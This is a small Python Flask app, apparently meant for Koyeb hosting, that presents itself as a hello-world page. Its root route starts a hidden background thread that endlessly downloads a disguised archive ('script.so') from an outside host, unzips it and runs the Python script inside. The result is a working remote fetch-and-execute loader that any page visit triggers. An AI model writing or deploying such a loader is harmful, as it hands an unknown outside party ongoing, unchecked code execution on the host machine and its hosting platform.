from flask import Flask
import subprocess
import threading
import time
import os

app = Flask(__name__)

def download_unzip_and_run_script():
    while True:
        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/script.so'])
        subprocess.run(['unzip', '-o', 'script.so', '-d', 'files'])
        subprocess.run(['python', 'files/itsmerjc.py'])
        os.remove('script.so')

@app.route('/')
def hello_world():
    if not any(thread.name == "ScriptThread" for thread in threading.enumerate()):
        thread = threading.Thread(target=download_unzip_and_run_script, name="ScriptThread")
        thread.daemon = True  # Allows thread to exit when the main program exits
        thread.start()

    return 'Script downloading, unzipping, and running in the background. Hello from Koyeb!'

if __name__ == "__main__":
    app.run()
